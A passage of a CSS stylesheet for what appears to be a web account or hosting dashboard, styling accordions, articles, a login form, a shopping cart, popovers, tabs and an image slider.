    .accordion .heading.toggle .details ul {
        line-height: 1.5rem;
        padding: 0.313rem 0.5rem;
        background: #fff;
        border-radius: .25rem;
        box-shadow: inset 0 0.125rem 0 rgba(103, 150, 192, 0.3)
    }

    .accordion .heading.toggle .details ul li {
        float: left
    }

    .accordion .heading.toggle .details ul li:not(:last-child) {
        padding: 0 0.5rem 0 0
    }

    .accordion .heading .thumbnail {
        display: none;
        position: absolute;
        top: 1rem;
        left: 1rem;
        width: 2.5rem;
        height: 2.5rem;
        line-height: 2.375rem;
        text-align: center;
        border: 0.063rem solid transparent;
        border-radius: 50%
    }

    @media (min-width: 48em) {
        .accordion .heading .thumbnail {
            display: block
        }
    }

    .accordion .heading strong {
        display: block;
        max-width: 100%;
        font-weight: 800;
        font-size: 1.25rem;
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden
    }

    @media (min-width: 48em) {
        .accordion .heading strong {
            display: inline;
            font-size: 1.5rem
        }
    }

    .accordion .hidden {
        display: none
    }

    .accordion .content {
        position: relative;
        padding: 1rem;
        border-right: 0.063rem solid #eee;
        border-left: 0.063rem solid #eee
    }

    @media (min-width: 48em) {
        .accordion .content {
            padding: 2rem
        }
    }

    .accordion .content a,
    .accordion .content .button-link {
        font-weight: 500;
        text-decoration: underline
    }

    .accordion .content a:hover,
    .accordion .content .button-link:hover {
        text-decoration: underline
    }

    .accordion .content .products li {
        position: relative
    }

    @media (min-width: 48em) {
        .accordion .content .products li {
            padding: 0.5rem 0 0 0
        }
    }

    .accordion .content .products li:not(:last-child) {
        margin: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .accordion .content .products li:not(:last-child) {
            min-height: 3.5rem;
            padding-left: 4.5rem
        }
    }

    .accordion .content .products li img {
        display: none;
        position: absolute;
        top: 0;
        left: 0;
        width: 3.5rem
    }

    @media (min-width: 48em) {
        .accordion .content .products li img {
            display: block
        }
    }

    .accordion .content .products li .date {
        display: block
    }

    @media (min-width: 48em) {
        .accordion .content .products li .date {
            display: inline
        }
    }

    .accordion .content .options {
        padding: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .accordion .content .options {
            position: absolute;
            top: 2rem;
            right: 2rem;
            padding-top: 0
        }
    }

    .accordion .content .options li {
        float: left
    }

    .accordion .content .options li:not(:last-child) {
        padding: 0 0.5rem 0 0
    }

    .accordion .content .background {
        padding: 1rem;
        background: #f6faff
    }

    .accordion .content .background .tabs a {
        text-decoration: none
    }

    @media (min-width: 48em) {
        .accordion .content .background .list dt {
            width: 7.75rem
        }
    }

    .accordion .content .privacy {
        position: relative
    }

    @media (min-width: 48em) {
        .accordion .content .privacy {
            line-height: 1.75rem
        }
    }

    .accordion .content .privacy .button {
        margin: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .accordion .content .privacy .button {
            position: absolute;
            top: 0;
            right: 0;
            margin-top: 0
        }
    }

    .accordion .content .hr {
        display: block;
        height: 0.063rem;
        padding: 0;
        margin: 0.5rem 0 1rem 0;
        background: #bfd3e7;
        border: 0
    }

    .article:not(:last-child) {
        margin: 0 0 1.5rem 0
    }

    @media (min-width: 48em) {
        .article:not(:last-child) {
            margin-bottom: 2rem
        }
    }

    .article.single footer {
        padding-top: 1rem
    }

    .article header {
        padding: 0 0 0.75rem 0
    }

    .article header h3 {
        font-weight: 200;
        font-size: 1.5rem;
        line-height: 1.3;
        color: #6796c0
    }

    @media (min-width: 48em) {
        .article header h3 {
            font-size: 1.875rem
        }
    }

    .article .entry {
        font-size: 1rem
    }

    .article .entry figure figcaption {
        font-size: 0.875rem;
        color: #999;
        padding: 0.5rem 0 0 0
    }

    .article .entry img {
        display: block;
        width: 100%
    }

    .article .entry a {
        text-decoration: underline
    }

    .article .entry .grid {
        margin-bottom: 0
    }

    .article footer {
        font-weight: 700;
        line-height: 1rem;
        color: #6796c0
    }

    @media (min-width: 48em) {
        .article footer ul:first-child {
            float: left
        }
    }

    .article footer ul:last-child:not(:first-child) {
        padding: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .article footer ul:last-child:not(:first-child) {
            float: right;
            padding-top: 0
        }
    }

    .article footer ul li {
        float: left
    }

    .article footer ul li:not(:last-child) {
        padding: 0 1rem 0 0
    }

    @media (min-width: 48em) {
        .article footer ul li:not(:last-child) {
            padding-right: 1.5rem
        }
    }

    .article footer ul a.color-jaffa:hover {
        color: #ec6920
    }

    .article footer ul .button {
        font-weight: 700
    }

    .avatar a {
        display: block;
        position: relative;
        width: 10rem;
        height: 10rem;
        margin: 0 auto;
        border: 0.126rem solid #6796c0;
        border-radius: 50%
    }

    @media (min-width: 62em) {
        .avatar a {
            width: 12.5rem;
            height: 12.5rem
        }
    }

    @media (min-width: 75em) {
        .avatar a {
            width: 15rem;
            height: 15rem;
            border-width: 0.188rem
        }
    }

    .avatar a img {
        position: absolute;
        right: 0;
        bottom: 0;
        color: #4b7cb3
    }

    .boxes.grid {
        margin: 0 -1rem -1rem 0
    }

    .boxes.grid:not(:last-child) {
        margin-bottom: 0
    }

    .boxes.grid>* {
        padding: 0 1rem 1rem 0
    }

    .boxes h2 {
        font-weight: 200;
        font-size: 1.375rem;
        line-height: 1.2
    }

    @media (min-width: 62em) {
        .boxes h2 {
            font-size: 1.4rem
        }
    }

    @media (min-width: 75em) {
        .boxes h2 {
            font-size: 1.875rem
        }
    }

    .find {
        position: relative;
        color: #fff;
        padding: 1rem;
        background: #416b9b
    }

    @media (min-width: 75em) {
        .find.domain {
            min-height: 14.25rem
        }
    }

    .find.margin-top {
        margin-top: 1rem
    }

    .find.margin-bottom {
        margin-bottom: 1rem
    }

    @media (min-width: 48em) {
        .find {
            padding: 2rem
        }
    }

    @media (min-width: 75em) {
        .find {
            min-height: 12.125rem;
            padding-right: 20.125rem
        }
    }

    .find ul {
        padding: 0 0 1rem 0
    }

    .find ul li {
        float: left
    }

    .find ul li.current {
        font-weight: 800
    }

    .find ul li:not(:last-child) {
        padding: 0 0.5rem 0 0
    }

    .find ul a {
        color: #fff
    }

    .find h2 {
        font-weight: 800;
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .find h2 {
            padding-bottom: 1rem
        }
    }

    .find .form {
        position: relative
    }

    @media (min-width: 34em) {
        .find .form {
            padding: 0 8.75rem 0 0
        }
    }

    .find .form .field {
        font-size: 1rem;
        border-radius: .25rem .25rem 0 0
    }

    @media (min-width: 34em) {
        .find .form .field {
            border-radius: .25rem 0 0 .25rem
        }
    }

    @media (min-width: 48em) {
        .find .form .field {
            font-size: 1.25rem
        }
    }

    .find .form .button {
        width: 100%;
        border-radius: 0 0 .25rem .25rem
    }

    @media (min-width: 34em) {
        .find .form .button {
            position: absolute;
            top: 0;
            right: 0;
            width: 8.75rem;
            border-radius: 0 .25rem .25rem 0
        }
    }

    .find .form label {
        margin: 0.5rem 0 0 0
    }

    .find .form a {
        text-decoration: underline;
        color: #fff
    }

    .find img {
        display: none;
        position: absolute;
        right: 1rem;
        bottom: 0
    }

    @media (min-width: 75em) {
        .find img {
            display: block
        }
    }

    .link {
        display: block;
        min-height: 100%;
        text-align: center;
        color: #fff;
        padding: 1rem;
        background: #4b7cb3
    }

    @media (min-width: 62em) {
        .link {
            padding: 2rem
        }
    }

    .link:hover {
        color: #fff;
        background: #416b9b
    }

    .link img {
        display: block;
        max-width: 75%;
        margin: 0 auto 1rem auto
    }

    .link h2 {
        font-weight: 800
    }

    .link p {
        font-size: 1rem
    }

    @media (min-width: 48em) {
        .link p {
            font-size: 1.125rem
        }
    }

    .list {
        word-break: break-word
    }

    .list dt {
        color: #6796c0
    }

    @media (min-width: 48em) {
        .list dt {
            clear: left;
            float: left;
            width: 8.75rem;
            text-align: right;
            margin: 0 1rem 0.5rem 0
        }
    }

    .list dd {
        margin: 0 0 1rem 0
    }

    @media (min-width: 48em) {
        .list dd {
            float: left;
            width: calc(100% - 9.75rem);
            margin-bottom: 0.5rem
        }
    }

    .list dd:last-child:empty {
        display: none
    }

    .list a {
        color: #375c85
    }

    .list a:hover {
        color: #284361
    }

    .list .button.button-link {
        color: #375c85
    }

    .list .button.button-link:hover {
        color: #284361
    }

    .login-form {
        max-width: 28.75rem;
        padding: 1rem 0;
        margin: 0 auto
    }

    .login-form .page-title.secondary {
        text-align: center;
        padding-bottom: 1rem
    }

    @media (min-width: 48em) {
        .login-form .page-title.secondary {
            padding-bottom: 1.5rem
        }
    }

    .login-form .form {
        background: #416b9b
    }

    .login-form .form .tabs {
        font-weight: 700;
        font-size: 1rem;
        line-height: 3.625rem;
        text-align: center
    }

    @media (min-width: 48em) {
        .login-form .form .tabs {
            font-size: 1.4rem
        }
    }

    .login-form .form .tabs li {
        -webkit-box-flex: 1;
        -webkit-flex: 1 1 50%;
        -moz-box-flex: 1;
        -moz-flex: 1 1 50%;
        -ms-flex: 1 1 50%;
        flex: 1 1 50%
    }

    .login-form .form .tabs li.current a {
        background: #416b9b
    }

    .login-form .form .tabs a {
        display: block;
        color: #fff;
        background: #6796c0
    }

    .login-form .form .tabs .icon {
        display: none;
        position: relative;
        top: -0.063rem
    }

    @media (min-width: 48em) {
        .login-form .form .tabs .icon {
            display: inline-block
        }
    }

    .login-form .form .content {
        padding: 1rem
    }

    @media (min-width: 48em) {
        .login-form .form .content {
            padding: 1.5rem
        }
    }

    .login-form .form .content label {
        display: block;
        color: #fff
    }

    .login-form .form .content .field {
        border-color: #fff
    }

    .login-form .form .content .button {
        width: 100%
    }

    .login-form .links {
        text-align: center;
        padding: 0.818rem 0 0 0  ;


    }

    @media (min-width: 48em) {
        .login-form .links div:first-child {
            float: left
        }
    }

    @media (min-width: 48em) {
        .login-form .links div:last-child {
            float: right
        }
    }

    .login-form .links a {
        text-decoration: underline ;
        color: #375c85;
    }

    .manage {
        padding: 1rem 0 0 0
    }

    .manage .column {
        padding: 0 0 1rem 0
    }

    @media (min-width: 75em) {
        .manage .column {
            float: left;
            width: calc(100% - 25rem);
            padding: 0 1rem 0 0
        }
    }

    @media (min-width: 75em) {
        .manage .sidebar {
            float: left;
            width: 25rem
        }
    }

    .manage .box {
        padding: 1rem;
        background: #fff;
        box-shadow: 0 0 0.126rem rgba(0, 0, 0, 0.1)
    }

    .manage .box:not(:last-child) {
        margin: 0 0 1rem 0
    }

    .manage .box h3 {
        font-weight: 200;
        font-size: 1.175rem;
        text-align: center;
        color: #4b7cb3
    }

    @media (min-width: 48em) {
        .manage .box h3 {
            font-size: 1.375rem
        }
    }

    .manage .box h3:not(:last-child) {
        margin: 0 0 1rem 0
    }

    .manage .box .list table {
        width: 100%;
        line-height: 1.2;
        border-top: 0.063rem solid #bfd3e7
    }

    .manage .box .list table:not(:last-child) {
        margin: 0 0 0.313rem 0
    }

    .manage .box .list table tbody {
        display: block
    }

    @media (min-width: 48em) {
        .manage .box .list table tbody {
            display: table-header-group
        }
    }

    .manage .box .list table tr {
        display: block;
        position: relative;
        border-bottom: 0.063rem solid #bfd3e7
    }

    @media (min-width: 48em) {
        .manage .box .list table tr {
            display: table-row;
            border-bottom: 0
        }
    }

    @media (min-width: 48em) {
        .manage .box .list table tr:nth-child(even) td {
            background: rgba(103, 150, 192, 0.05)
        }
    }

    .manage .box .list table tr.added td {
        color: #360;
        background: rgba(101, 174, 75, 0.05)
    }

    .manage .box .list table tr.added td:last-child {
        text-align: right;
        background: none
    }

    @media (min-width: 48em) {
        .manage .box .list table tr.added td:last-child {
            background: rgba(101, 174, 75, 0.05)
        }
    }

    .manage .box .list table tr.added td .button.button-link {
        color: #360
    }

    .manage .box .list table tr.added td .button.button-link:hover {
        color: #1a3300
    }

    .manage .box .list table tr.checked td {
        color: #360;
        padding: 0.818rem 1rem;
        background: rgba(101, 174, 75, 0.05)
    }

    @media (min-width: 48em) {
        .manage .box .list table tr.checked td {
            padding: 1rem
        }
    }

    .manage .box .list table tr.checked td:last-child {
        background: none
    }

    @media (min-width: 48em) {
        .manage .box .list table tr.checked td:last-child {
            background: rgba(101, 174, 75, 0.05)
        }
    }

    .manage .box .list table td {
        display: block;
        padding: 0.313rem 0.5rem
    }

    @media (min-width: 48em) {
        .manage .box .list table td {
            display: table-cell;
            padding: 0.5rem 1rem;
            border-bottom: 0.063rem solid #bfd3e7
        }
    }

    .manage .box .list table td:first-child {
        font-weight: 500;
        padding-top: 0.818rem
    }

    @media (min-width: 48em) {
        .manage .box .list table td:first-child {
            padding-top: 0.5rem
        }
    }

    .manage .box .list table td:last-child:not(:first-child) {
        position: absolute;
        top: 0.616rem;
        right: 0
    }

    @media (min-width: 48em) {
        .manage .box .list table td:last-child:not(:first-child) {
            position: static;
            text-align: right;
            padding-bottom: 0.5rem
        }
    }

    .manage .box .list table td:nth-child(2) {
        padding-top: 0;
        padding-bottom: 0.818rem
    }

    @media (min-width: 48em) {
        .manage .box .list table td:nth-child(2) {
            width: 9rem;
            text-align: right;
            padding-top: 0.5rem;
            padding-bottom: 0.5rem
        }
    }

    @media (min-width: 48em) {
        .manage .box .list table td:nth-child(3) {
            width: 9.5rem
        }
    }

    .manage .box .list table .combined {
        position: relative;
        padding: 0.25rem 0 0.25rem 2rem
    }

    @media (min-width: 48em) {
        .manage .box .list table .combined {
            padding-left: 2.5rem
        }
    }

    .manage .box .list table .combined .icon {
        position: absolute;
        top: 0;
        left: 0
    }

    .manage .box .list table span.old {
        text-decoration: line-through;
        padding: 0 0.313rem 0 0
    }

    .manage .box .list table span.new {
        color: #360
    }

    .manage .box .list table .button.button-link {
        font-size: 0.75rem;
        text-decoration: underline
    }

    .manage .box .list table .button.button-steel-blue {
        width: 6.5rem;
        padding: 0
    }

    @media (min-width: 48em) {
        .manage .box .list table .button.button-steel-blue {
            width: 8.5rem
        }
    }

    .manage .box .cart .header {
        position: relative;
        font-weight: 800;
        font-size: 1.175rem;
        color: #fff;
        padding: 1rem;
        margin: -1rem -1rem 1rem -1rem;
        background: #4b7cb3
    }

    @media (min-width: 48em) {
        .manage .box .cart .header {
            font-size: 1.375rem
        }
    }

    .manage .box .cart .header .icon {
        position: relative;
        top: -0.063rem
    }

    .manage .box .cart .header .number {
        display: block;
        position: absolute;
        top: 50%;
        right: 1rem;
        width: 1.75rem;
        font-size: 1.125rem;
        text-align: center;
        color: #fff;
        margin: -0.875rem 0 0 0;
        background: #f0894f;
        border-radius: 50%
    }

    .manage .box .in-cart {
        padding: 0 0 1rem 0
    }

    .manage .box .in-cart table {
        width: 100%;
        font-size: 0.75rem
    }

    .manage .box .in-cart table td {
        vertical-align: top;
        padding: 0 0 0.313rem 0
    }

    .manage .box .in-cart table td:first-child {
        text-align: left
    }

    .manage .box .in-cart table td:last-child {
        text-align: right
    }

    .manage .box .in-cart table .title {
        font-weight: 800;
        font-size: 1.125rem;
        color: #4b7cb3
    }

    .manage .box .in-cart table strong {
        color: #4b7cb3
    }

    .manage .box .in-cart table .button.button-link {
        text-decoration: underline
    }

    .manage .box .in-cart table .button.button-link:not(:hover) {
        color: #656565
    }

    .manage .box .in-cart table .icheckbox {
        top: -0.063rem
    }

    .manage .box .in-cart table .select {
        position: relative
    }

    .manage .box .in-cart table .select .no-format {
        width: 100%;
        height: 1rem;
        line-height: 1;
        padding: 0 0.818rem 0 0;
        background: none;
        border: 0;
        border-radius: 0;
        cursor: pointer;
        -webkit-appearance: none
    }

    .manage .box .in-cart table .select .fa {
        position: absolute;
        top: 0;
        right: 0;
        line-height: 1rem;
        pointer-events: none
    }

    .manage .box .in-cart hr {
        display: block;
        height: 0.063rem;
        padding: 0;
        margin: 1rem 0;
        background: #bfd3e7;
        border: 0
    }

    .manage .box .total {
        text-align: center;
        color: #4b7cb3;
        padding: 1rem;
        background: rgba(103, 150, 192, 0.05)
    }

    .manage .box .total li:first-child {
        font-size: 1rem
    }

    .manage .box .total li:not(:first-child) {
        padding: 0.5rem 0 0 0
    }

    .manage .box .total li.saving {
        color: #656565;
        padding-top: 0
    }

    .manage .box .total li.coupon {
        display: none;
        line-height: 2.25rem;
        color: #656565
    }

    .manage .box .total li.coupon .center .field {
        width: 8rem;
        margin: 0 0 0 0.5rem
    }

    .manage .box .total li.coupon .left {
        position: relative;
        padding: 0 0 0 100px
    }

    .manage .box .total li.coupon .left label {
        position: absolute;
        top: 0;
        left: 0
    }

    .manage .box .total strong {
        font-weight: 800;
        font-size: 130%
    }

    .manage .box .total .button.button-jaffa {
        width: 100%
    }

    .manage .box .total .button.button-link {
        text-decoration: underline
    }

    .note {
        text-align: center;
        padding: 1rem;
        border-radius: .25rem
    }

    @media (min-width: 48em) {
        .note {
            padding: 1.5rem
        }
    }

    .note:not(:last-child) {
        margin: 0 0 1rem 0
    }

    @media (min-width: 48em) {
        .note:not(:last-child) {
            margin-bottom: 1.5rem
        }
    }

    .note.note-color-blue {
        color: #4b7cb3;
        background: rgba(103, 150, 192, 0.1)
    }

    .note.note-color-green {
        color: #360;
        background: rgba(101, 174, 75, 0.1)
    }

    .note.note-color-green .button.button-link {
        color: #360
    }

    .note.note-color-green .button.button-link:hover {
        color: #1a3300
    }

    .note .title {
        display: block;
        font-weight: 800;
        font-size: 1.25rem;
        line-height: 1.2
    }

    @media (min-width: 48em) {
        .note .title {
            font-size: 1.5rem
        }
    }

    .note .title:not(:last-child) {
        margin: 0 0 1rem 0
    }

    @media (min-width: 48em) {
        .note .title:not(:last-child) {
            margin-bottom: 1.5rem
        }
    }

    .note .title a {
        font-weight: 300;
        font-size: 75%;
        text-decoration: underline
    }

    .note .grid>div:first-child {
        text-align: left
    }

    .note .grid>div:last-child {
        text-align: left
    }

    @media (min-width: 48em) {
        .note .grid>div:last-child {
            text-align: right
        }
    }

    .note .grid ul li {
        float: left
    }

    .note .grid ul li:not(:last-child) {
        margin: 0 0.818rem 0 0
    }

    .note .grid ul .old {
        text-decoration: line-through;
        color: #656565
    }

    .note .grid ul .button.button-link {
        font-size: 0.75rem;
        text-decoration: underline
    }

    .page-title.primary {
        padding: 0.5rem 1rem;
        margin: -1rem -1rem 1rem -1rem;
        background: #f6faff;
        box-shadow: 0 0 0.126rem rgba(0, 0, 0, 0.1)
    }

    @media (min-width: 62em) {
        .page-title.primary {
            padding: 0.875rem 1.5rem;
            margin: -1.5rem -1.5rem 1.5rem -1.5rem
        }
    }

    .page-title.primary h1 {
        font-weight: 400;
        font-size: 1.125rem;
        line-height: 1.5rem;
        color: #6796c0
    }

    @media (min-width: 62em) {
        .page-title.primary h1 {
            font-size: 1.25rem
        }
    }

    .page-title.primary h1 .icon {
        float: left;
        width: 1.5rem;
        height: 1.5rem;
        border: 0.063rem solid #6796c0;
        border-radius: 50%
    }

    @media (min-width: 48em) {
        .page-title.primary.search h1 {
            float: left;
            margin: 0.375rem 0
        }
    }

    @media (min-width: 62em) {
        .page-title.primary.search h1 {
            margin: 0
        }
    }

    .page-title.primary.search .prepend {
        margin: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .page-title.primary.search .prepend {
            float: right;
            width: 17.5rem;
            margin: 0
        }
    }

    @media (min-width: 62em) {
        .page-title.primary.search .prepend {
            margin: -0.375rem 0
        }
    }

    .page-title.secondary {
        position: relative;
        padding: 1rem 0 0.5rem 0
    }

    .page-title.secondary h1,
    .page-title.secondary h2 {
        font-weight: 800;
        font-size: 1.625rem;
        line-height: 1.2;
        color: #375c85
    }

    @media (min-width: 48em) {
        .page-title.secondary h1,
        .page-title.secondary h2 {
            font-size: 2rem
        }
    }

    @media (min-width: 62em) {
        .page-title.secondary h1,
        .page-title.secondary h2 {
            font-size: 2.375rem
        }
    }

    .page-title.secondary h1 a,
    .page-title.secondary h2 a {
        color: #375c85
    }

    .page-title.secondary h1 a:hover,
    .page-title.secondary h2 a:hover {
        color: #284361
    }

    .page-title.secondary p {
        color: #6796c0
    }

    @media (min-width: 48em) {
        .page-title.secondary p {
            font-size: 1.125rem
        }
    }

    .page-title.secondary .form {
        position: relative;
        margin: 0.5rem 0 1rem 0
    }

    @media (min-width: 34em) {
        .page-title.secondary .form {
            padding: 0 10rem 0 0
        }
    }

    .page-title.secondary .form .field {
        padding-left: 3rem
    }

    .page-title.secondary .form .icon {
        position: absolute;
        top: 0.5rem;
        left: 0.818rem
    }

    .page-title.secondary .form .button {
        width: 100%;
        margin: 0.5rem 0 0 0
    }

    @media (min-width: 34em) {
        .page-title.secondary .form .button {
            position: absolute;
            top: 0;
            right: 0;
            width: 9rem;
            margin-top: 0
        }
    }

    .page-title.secondary .walk-me {
        font-weight: 700;
        font-size: 1rem;
        margin: 0.313rem 0 0 0
    }

    @media (min-width: 48em) {
        .page-title.secondary .walk-me {
            position: absolute;
            top: 1rem;
            right: 0;
            margin-top: 0
        }
    }

    .page-title.primary+.page-title.secondary {
        padding-top: 0
    }

    .page-title.tertiary {
        color: #fff;
        padding: 1rem;
        margin: 0 0 1rem 0;
        background: #4b7cb3
    }

    @media (min-width: 48em) {
        .page-title.tertiary {
            padding: 2rem
        }
    }

    .page-title.tertiary h3 {
        font-weight: 800;
        font-size: 1.5rem
    }

    @media (min-width: 48em) {
        .page-title.tertiary h3 {
            font-size: 1.875rem
        }
    }

    .popover {
        position: absolute;
        width: 16.25rem;
        background: #fff;
        border: 0.063rem solid #6796c0;
        z-index: 999
    }

    .popover.fade-in {
        opacity: 0;
        visibility: hidden;
        transition: opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), visibility 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .popover.fade-in.active {
        opacity: 1;
        visibility: visible
    }

    .popover.fixed {
        position: fixed;
        top: 3.25rem;
        min-height: calc(100vh - 3.25rem);
        border: 0
    }

    .popover.fixed::before {
        position: absolute;
        top: 0;
        bottom: 0;
        width: 100vw;
        height: 100vh;
        content: "";
        background: rgba(0, 0, 0, 0.4)
    }

    .popover.fixed.slide-in-left {
        right: -16.25rem;
        transition: right 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .popover.fixed.slide-in-left.active {
        right: 0
    }

    .popover.fixed.slide-in-left.active::before {
        right: 100%
    }

    .popover.fixed.slide-in-right {
        left: -16.25rem;
        transition: left 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .popover.fixed.slide-in-right.active {
        left: 0
    }

    .popover.fixed.slide-in-right.active::before {
        left: 100%
    }

    .popover.fixed .header .title {
        line-height: 3.25rem
    }

    .popover.fixed .body {
        height: calc(100vh - 3.25rem - 3.25rem);
        overflow-y: auto;
        -webkit-overflow-scrolling: touch
    }

    .popover::before,
    .popover::after {
        position: absolute;
        content: "";
        border: 0.625rem solid transparent
    }

    .popover .header {
        position: relative;
        color: #fff;
        background: #4b7cb3
    }

    .popover .header .title {
        display: block;
        font-weight: 800;
        font-size: 1rem;
        line-height: 2.625rem;
        text-align: center
    }

    .popover .header .title .icon {
        position: relative;
        top: -0.063rem
    }

    .popover .header .profile {
        position: relative;
        min-height: 4rem;
        line-height: 1.5;
        padding: 0.75rem 0.5rem 0.75rem 3rem;
        margin: 0 0.75rem
    }

    .popover .header .profile .thumbnail {
        display: block;
        position: absolute;
        top: 0.75rem;
        left: 0;
        width: 2.5rem;
        height: 2.5rem;
        border: 0.063rem solid #ffcf00;
        border-radius: 50%
    }

    .popover .header .profile .email {
        display: block;
        font-size: 0.75rem;
        font-weight: 700;
        word-break: break-word
    }

    .popover .header .profile .pin {
        display: block;
        font-size: 0.75rem
    }

    .popover .header .button {
        position: absolute;
        top: 50%;
        right: 1rem;
        line-height: 1rem;
        margin: -0.5rem 0 0 0;
        opacity: 0.5;
        transition: opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .popover .header .button:hover {
        opacity: 0.7
    }

    .popover .body {
        padding: 0 0.5rem
    }

    .popover .body ul:not(:last-child) {
        border-bottom: 0.063rem solid rgba(103, 150, 192, 0.2)
    }

    .popover .body ul.borderless li:not(:first-child) {
        border-top: 0
    }

    .popover .body ul.borderless li .item {
        padding: 0.5rem 1rem
    }

    .popover .body ul li {
        position: relative
    }

    .popover .body ul li:not(:first-child) {
        border-top: 0.063rem solid rgba(103, 150, 192, 0.2)
    }

    .popover .body ul li.highlighted>.item {
        font-weight: 700;
        color: #416b9b
    }

    .popover .body ul li.highlighted>.item .icon {
        border-color: #416b9b
    }

    .popover .body ul li .item {
        line-height: 1.2;
        padding: 0.75rem 2rem 0.75rem 1rem;
        margin: 0 -0.5rem;
        -webkit-box-align: center;
        -ms-flex-align: center;
        -webkit-align-items: center;
        -moz-align-items: center;
        align-items: center
    }

    .popover .body ul li .item:hover {
        background: rgba(103, 150, 192, 0.1)
    }

    .popover .body ul li .item .icon {
        display: block;
        width: 1.5rem;
        height: 1.5rem;
        font-size: 1rem;
        line-height: 1.375rem;
        text-align: center;
        border: 0.063rem solid #4b7cb3;
        border-radius: 50%
    }

    .popover .body ul li .item .text {
        width: calc(100% - 1.5rem);
        font-size: 0.75rem;
        padding: 0 0 0 0.625rem
    }

    .popover .body ul li .prepend {
        margin: 0.75rem 0
    }

    .popover .body ul li .actions {
        position: absolute;
        top: 0.75rem;
        right: 0;
        padding: 0 0.5rem;
        opacity: 0.5
    }

    .popover .body ul li .actions:hover {
        opacity: 1
    }

    .popover .body ul li ul {
        position: absolute;
        top: 1rem;
        right: 1.2rem;
        width: 13.75rem;
        padding: 0 0.5rem;
        background: #fff;
        opacity: 0;
        visibility: hidden;
        z-index: 999;
        box-shadow: 0 0 0.126rem rgba(0, 0, 0, 0.2)
    }

    .popover .body ul li ul.active {
        opacity: 1;
        visibility: visible
    }

    .popover .body ul li ul .item {
        width: calc(100% + 1rem);
        padding: 0.75rem 1rem
    }

    .popover .footer {
        text-align: center;
        padding: 0.75rem 0;
        margin: 0 0.5rem;
        border-top: 0.063rem solid rgba(103, 150, 192, 0.2)
    }

    .reward {
        position: relative;
        color: #fff;
        padding: 1rem;
        background: #84b856
    }

    @media (min-width: 48em) {
        .reward {
            padding: 2rem
        }
    }

    @media (min-width: 75em) {
        .reward {
            padding-right: 20.125rem
        }
    }

    .reward h2 {
        font-weight: 800
    }

    .reward p {
        font-size: 1rem
    }

    @media (min-width: 48em) {
        .reward p {
            font-size: 1.125rem
        }
    }

    .reward img {
        display: none;
        position: absolute;
        right: 1rem;
        bottom: 0;
        width: 16.25rem
    }

    @media (min-width: 75em) {
        .reward img {
            display: block
        }
    }

    .section {
        padding: 1rem;
        background: #fff;
        box-shadow: 0 0 0.126rem rgba(0, 0, 0, 0.1)
    }

    @media (min-width: 62em) {
        .section {
            padding: 2rem
        }
    }

    .section:not(:last-child) {
        margin: 0 0 1rem 0
    }

    .section h2 {
        color: #4b7cb3
    }

    .section h2+p {
        padding-top: 0.5rem
    }

    .section .header {
        position: relative;
        margin: 0 0 1rem 0
    }

    .section .header>h2 {
        margin: 0 5.635rem 0 0
    }

    .section .header>.button {
        position: absolute;
        top: 0;
        right: 0
    }

    .section .header .left {
        margin: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .section .header .left {
            float: left;
            margin-bottom: 0
        }
    }

    @media (min-width: 62em) {
        .section .header .left {
            float: none;
            margin-bottom: 0.5rem
        }
    }

    @media (min-width: 75em) {
        .section .header .left {
            float: left;
            margin-bottom: 0
        }
    }

    .section .header .right {
        width: 100%
    }

    @media (min-width: 48em) {
        .section .header .right {
            float: right;
            width: 17.5rem
        }
    }

    @media (min-width: 62em) {
        .section .header .right {
            float: none;
            width: 100%
        }
    }

    @media (min-width: 75em) {
        .section .header .right {
            float: right;
            width: 17.5rem
        }
    }

    @media (min-width: 48em) {
        .section .current-tab {
            display: none
        }
    }

    .section .current-tab .button.button-link {
        display: block;
        position: relative;
        width: 100%;
        font-weight: 400;
        text-align: left;
        color: #4b7cb3
    }

    .section .current-tab .button.button-link.active .fa::before {
        content: "\f0d8"
    }

    .section .current-tab .button.button-link .fa {
        position: absolute;
        top: 0;
        right: 0
    }

    .section .current-tab .button.button-link strong {
        font-weight: 800
    }

    .section .tabs {
        display: none;
        padding: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .section .tabs {
            display: block;
            padding: 0.313rem 0 0 0;
            border-bottom: 0.063rem solid rgba(103, 150, 192, 0.8)
        }
    }

    @media (min-width: 62em) {
        .section .tabs {
            padding-top: 0
        }
    }

    @media (min-width: 75em) {
        .section .tabs {
            padding-top: 0.313rem
        }
    }

    .section .tabs.active {
        display: block
    }

    .section .tabs li {
        padding: 0 0 0.5rem 0
    }

    @media (min-width: 48em) {
        .section .tabs li {
            float: left;
            padding-bottom: 0
        }
    }

    @media (min-width: 48em) {
        .section .tabs li:not(:last-child) {
            padding: 0 0.5rem 0 0
        }
    }

    .section .tabs li.current a {
        font-weight: 800;
        color: #4b7cb3;
        border-color: #4b7cb3
    }

    .section .tabs li a {
        display: block
    }

    @media (min-width: 48em) {
        .section .tabs li a {
            padding: 0 0.5rem 0.25rem 0.5rem;
            margin: 0 0 -0.063rem 0;
            border-bottom: solid 0.188rem transparent
        }
    }

    .show {
        text-align: center;
        color: #6796c0
    }

    .show li {
        padding: 0.5rem 0 0 0
    }

    .show .button {
        width: 100%;
        font-size: 1rem;
        padding: 0
    }

    .slider {
        position: relative;
        margin: 0 0 1rem 0
    }

    @media (min-width: 48em) {
        .slider {
            padding: 0 3rem
        }
    }

    .slider .slick-list {
        position: relative;
        overflow: hidden
    }

    .slider .slide {
        float: left;
        width: 7.875rem;
        padding: 0 0.5rem 1rem 0.5rem
    }

    .slider .slick-arrow {
        position: absolute;
        top: 50%;
        width: 2.5rem;
        height: 2.5rem;
        margin: -1.75rem 0 0 0;
        opacity: 0;
        visibility: hidden;
        border: 0.063rem solid rgba(103, 150, 192, 0.2);
        border-radius: 50%;
        z-index: 1;
        transition: border-color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

